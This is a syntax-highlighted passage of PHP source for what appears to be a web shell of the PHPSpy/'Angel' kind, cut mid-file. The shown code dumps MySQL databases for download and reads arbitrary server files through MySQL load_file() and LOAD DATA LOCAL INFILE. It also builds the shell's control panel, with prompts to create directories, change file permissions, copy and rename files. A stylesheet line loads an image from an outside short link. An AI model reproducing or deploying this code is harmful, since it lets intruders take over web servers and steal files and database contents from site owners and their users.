<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-Length: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">thefile</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">readfile(</span>$<span style="color: #f0c674;">thefile</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'backupmysql'</span> &amp;&amp; !$<span style="color: #f0c674;">saveasfile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">table</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> =<span style="color: #8abeb7;">'Please choose the table'</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>, $<span style="color: #f0c674;">dbuser</span>, $<span style="color: #f0c674;">dbpass</span>, $<span style="color: #f0c674;">dbname</span>, $<span style="color: #f0c674;">charset</span>, $<span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">basename(</span>$<span style="color: #f0c674;">dbname</span>.<span style="color: #8abeb7;">'.sql'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-type: application/unknown'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #f0c674;">filename</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">table</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">k</span> =&gt; $<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">sqldumptable(</span>$<span style="color: #f0c674;">v</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_close(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">doing</span>==<span style="color: #8abeb7;">'mysqldown'</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">dbname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'Please input dbname'</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>, $<span style="color: #f0c674;">dbuser</span>, $<span style="color: #f0c674;">dbpass</span>, $<span style="color: #f0c674;">dbname</span>, $<span style="color: #f0c674;">charset</span>, $<span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">mysqldlfile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #f0c674;">result</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">addslashes(</span>$<span style="color: #f0c674;">mysqldlfile</span>).<span style="color: #8abeb7;">"' INTO TA</span><span style="color: #8abeb7; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"select content from tmp_angel"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">row</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">result</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">row</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'Load file failed '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_error(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fileinfo</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">pathinfo(</span>$<span style="color: #f0c674;">mysqldlfile</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-type: application/x-'</span>.$<span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'extension'</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'b</span><span style="color: #8abeb7; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"Accept-Length: "</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">strlen(</span>$<span style="color: #f0c674;">row</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>]));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">row</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;html&gt;</span>
<span style="color: #81a2be;">&lt;head&gt;</span>
<span style="color: #81a2be;">&lt;meta</span> <span style="color: #cc6666; font-weight: bold;">http</span>-<span style="color: #cc6666; font-weight: bold;">equiv</span>=<span style="color: #8abeb7;">"Content-Type"</span> <span style="color: #81a2be;">content=</span><span style="color: #8abeb7;">"text/html; charset=gbk"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #81a2be;">&lt;title&gt;</span><span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">action</span>.<span style="color: #8abeb7;">' - '</span>.$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>];<span style="color: #b294bb;">?&gt;</span><span style="color: #81a2be;">&lt;/title&gt;</span>
<span style="color: #81a2be;">&lt;style</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"text/css"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #cc6666; font-weight: bold;">body</span>,<span style="color: #cc6666; font-weight: bold;">td</span>{<span style="color: #cc6666; font-weight: bold;">font</span>: <span style="color: #c5c8c6; background-color: #1d1f21;">12</span>px <span style="color: #cc6666; font-weight: bold;">Arial</span>,<span style="color: #cc6666; font-weight: bold;">Tahoma</span>;<span style="color: #cc6666; font-weight: bold;">line</span>-<span style="color: #cc6666; font-weight: bold;">height</span>: <span style="color: #c5c8c6; background-color: #1d1f21;">16</span>px;}
.<span style="color: #cc6666; font-weight: bold;">input</span>{<span style="color: #cc6666; font-weight: bold;">font</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">12</span>px <span style="color: #cc6666; font-weight: bold;">Arial</span>,<span style="color: #cc6666; font-weight: bold;">Tahoma</span>;<span style="color: #cc6666; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #969896; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.<span style="color: #cc6666; font-weight: bold;">area</span>{<span style="color: #cc6666; font-weight: bold;">font</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">12</span>px <span style="color: #8abeb7;">'Courier New'</span>, <span style="color: #cc6666; font-weight: bold;">Monospace</span>;<span style="color: #cc6666; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.<span style="color: #cc6666; font-weight: bold;">bt</span> {<span style="color: #cc6666; font-weight: bold;">border</span>-<span style="color: #cc6666; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #cc6666; font-weight: bold;">a</span> {<span style="color: #cc6666; font-weight: bold;">color</span>: <span style="color: #969896; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #cc6666; font-weight: bold;">a</span>:<span style="color: #cc6666; font-weight: bold;">hover</span>{<span style="color: #cc6666; font-weight: bold;">color</span>: <span style="color: #969896; font-style: italic;">#f00;text-decoration:none;}</span>
.<span style="color: #cc6666; font-weight: bold;">alt1</span> <span style="color: #cc6666; font-weight: bold;">td</span>{<span style="color: #cc6666; font-weight: bold;">border</span>-<span style="color: #cc6666; font-weight: bold;">top</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>px <span style="color: #cc6666; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #cc6666; font-weight: bold;">alt2</span> <span style="color: #cc6666; font-weight: bold;">td</span>{<span style="color: #cc6666; font-weight: bold;">border</span>-<span style="color: #cc6666; font-weight: bold;">top</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>px <span style="color: #cc6666; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #cc6666; font-weight: bold;">focus</span> <span style="color: #cc6666; font-weight: bold;">td</span>{<span style="color: #cc6666; font-weight: bold;">border</span>-<span style="color: #cc6666; font-weight: bold;">top</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>px <span style="color: #cc6666; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #cc6666; font-weight: bold;">head</span> <span style="color: #cc6666; font-weight: bold;">td</span>{<span style="color: #cc6666; font-weight: bold;">border</span>-<span style="color: #cc6666; font-weight: bold;">top</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>px <span style="color: #cc6666; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #cc6666; font-weight: bold;">head</span> <span style="color: #cc6666; font-weight: bold;">td</span> <span style="color: #cc6666; font-weight: bold;">span</span>{<span style="color: #cc6666; font-weight: bold;">font</span>-<span style="color: #cc6666; font-weight: bold;">weight</span>:<span style="color: #cc6666; font-weight: bold;">normal</span>;}
.<span style="color: #cc6666; font-weight: bold;">infolist</span> {<span style="color: #cc6666; font-weight: bold;">padding</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">10</span>px;<span style="color: #cc6666; font-weight: bold;">margin</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">10</span>px <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> <span style="color: #c5c8c6; background-color: #1d1f21;">20</span>px <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #969896; font-style: italic; text-decoration: underline;"> #ddd;}</span>
<span style="color: #cc6666; font-weight: bold;">form</span>{<span style="color: #cc6666; font-weight: bold;">margin</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">padding</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;}
<span style="color: #cc6666; font-weight: bold;">h2</span>{<span style="color: #cc6666; font-weight: bold;">margin</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">padding</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">height</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">24</span>px;<span style="color: #cc6666; font-weight: bold;">line</span>-<span style="color: #cc6666; font-weight: bold;">height</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">24</span>px;<span style="color: #cc6666; font-weight: bold;">font</span>-<span style="color: #cc6666; font-weight: bold;">size</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">14</span>px;<span style="color: #cc6666; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#5B686F;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">}</span>
<span style="color: #cc6666; font-weight: bold;">ul</span>.<span style="color: #cc6666; font-weight: bold;">info</span> <span style="color: #cc6666; font-weight: bold;">li</span>{<span style="color: #cc6666; font-weight: bold;">margin</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#444;line-height:24px;height:24px;}</span>
<span style="color: #cc6666; font-weight: bold;">u</span>{<span style="color: #cc6666; font-weight: bold;">text</span>-<span style="color: #cc6666; font-weight: bold;">decoration</span>: <span style="color: #cc6666; font-weight: bold;">none</span>;<span style="color: #cc6666; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #969896; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.<span style="color: #cc6666; font-weight: bold;">drives</span>{<span style="color: #cc6666; font-weight: bold;">padding</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">5</span>px;}
.<span style="color: #cc6666; font-weight: bold;">drives</span> <span style="color: #cc6666; font-weight: bold;">span</span> {<span style="color: #cc6666; font-weight: bold;">margin</span>:<span style="color: #cc6666; font-weight: bold;">auto</span> <span style="color: #c5c8c6; background-color: #1d1f21;">7</span>px;}
<span style="color: #81a2be;">&lt;/style&gt;</span>
<span style="color: #81a2be;">&lt;script</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"text/javascript"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">CheckAll</span>(<span style="color: #cc6666; font-weight: bold;">form</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;<span style="color: #cc6666; font-weight: bold;">i</span><span style="color: #81a2be;">&lt;form</span>.<span style="color: #cc6666; font-weight: bold;">elements</span>.<span style="color: #cc6666; font-weight: bold;">length</span>;<span style="color: #cc6666; font-weight: bold;">i</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">e</span> = <span style="color: #cc6666; font-weight: bold;">form</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">elements[</span><span style="color: #cc6666; font-weight: bold;">i</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">e</span>.<span style="color: #cc6666; font-weight: bold;">name</span> != <span style="color: #8abeb7;">'chkall'</span>)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">e</span>.<span style="color: #cc6666; font-weight: bold;">checked</span> = <span style="color: #cc6666; font-weight: bold;">form</span>.<span style="color: #cc6666; font-weight: bold;">chkall</span>.<span style="color: #cc6666; font-weight: bold;">checked</span>;
<span style="background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">$</span>(<span style="color: #cc6666; font-weight: bold;">id</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #cc6666; font-weight: bold;">document</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">getElementById(</span><span style="color: #cc6666; font-weight: bold;">id</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createdir</span>(){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">newdirname</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">newdirname</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">prompt(</span><span style="color: #8abeb7;">'Please input the directory name:'</span>, <span style="color: #8abeb7;">''</span>  );
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">newdirname</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'createdir'</span>).<span style="color: #cc6666; font-weight: bold;">newdirname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">newdirname</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'createdir'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">fileperm</span>(<span style="color: #cc6666; font-weight: bold;">pfile</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">newperm</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">newperm</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">prompt(</span><span style="color: #8abeb7;">'Current file:'</span>+<span style="color: #cc6666; font-weight: bold;">pfile</span>+<span style="color: #8abeb7;">'\nPlease input new attribute:'</span>, <span style="color: #8abeb7;">''</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">newperm</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileperm'</span>).<span style="color: #cc6666; font-weight: bold;">newperm</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">newperm</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileperm'</span>).<span style="color: #cc6666; font-weight: bold;">pfile</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">pfile</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'fileperm'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">copyfile</span>(<span style="color: #cc6666; font-weight: bold;">sname</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">tofile</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">tofile</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">prompt(</span><span style="color: #8abeb7;">'Original file:'</span>+<span style="color: #cc6666; font-weight: bold;">sname</span>+<span style="color: #8abeb7;">'\nPlease input object file (fullpath</span><span style="color: #8abeb7; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">tofile</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'copyfile'</span>).<span style="color: #cc6666; font-weight: bold;">tofile</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">tofile</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'copyfile'</span>).<span style="color: #cc6666; font-weight: bold;">sname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">sname</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'copyfile'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">rename</span>(<span style="color: #cc6666; font-weight: bold;">oldname</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">newfilename</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">newfilename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">prompt(</span><span style="color: #8abeb7;">'Former file name:'</span>+<span style="color: #cc6666; font-weight: bold;">oldname</span>+<span style="color: #8abeb7;">'\nPlease input new filenam</span><span style="color: #8abeb7; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #cc6666; font-weight: bold;">newfilename</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'rename'</span>).<span style="color: #cc6666; font-weight: bold;">newfilename</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">newfilename</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'rename'</span>).<span style="color: #cc6666; font-weight: bold;">oldname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">oldname</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'rename'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dofile</span>(<span style="color: #cc6666; font-weight: bold;">doing</span>,<span style="color: #cc6666; font-weight: bold;">thefile</span>,<span style="color: #cc6666; font-weight: bold;">m</span>){
